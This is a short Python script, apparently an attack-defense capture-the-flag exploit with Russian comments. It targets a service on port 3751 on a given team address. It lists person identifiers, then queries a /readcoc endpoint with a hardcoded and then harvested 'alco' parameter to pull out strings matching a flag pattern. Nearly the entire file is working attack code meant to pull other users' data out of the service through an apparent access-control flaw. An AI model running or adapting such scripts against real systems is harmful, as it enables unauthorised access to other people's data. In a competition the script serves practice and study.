#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import redis
import base64
import socket
import sys
import re
import json
import requests as req
FLAG_FORMAT = r"([a-zA-Z0-9]{31}=)"


def post(site, data, s):
    try:
        data = s.post(site, data=data)
        return data.text
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def get(site, s):
    try:
        data = s.get(site)
        return data.text
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def find_log(data):
    return re.findall(r'(log:[\d.]+)', data) or []


def find_flags(data):
    return re.findall(FLAG_FORMAT, data) or []


def exploit(url):
    flags = [0]
    s = req.Session()
    data = get('http://{}:3751/list/*'.format(url), s)

    for person in re.findall(r'([a-zA-Z0-9]+-[a-zA-Z0-9]+-[a-zA-Z0-9]+)', data):
        data = get('http://{}:3751/readcoc?person={}&alco=1T7XSN'.format(url, person), s)
        for alco in re.findall(r'.2:3751/2([a-zA-Z0-9]+)', data):
            data = get('http://{}:3751/readcoc?person={}&alco={}'.format(url, person, alco), s)
            flags.extend(find_flags(data))
    return flags


if __name__ == "__main__":
    # На вход получаем название команды и адрес команды
    url = sys.argv[1]  # № '6.6.43.2'
    # Возвращаем ответ в консоль, чтобы наш основной процесс перехватил сообщение
    print(exploit(url), flush=True)
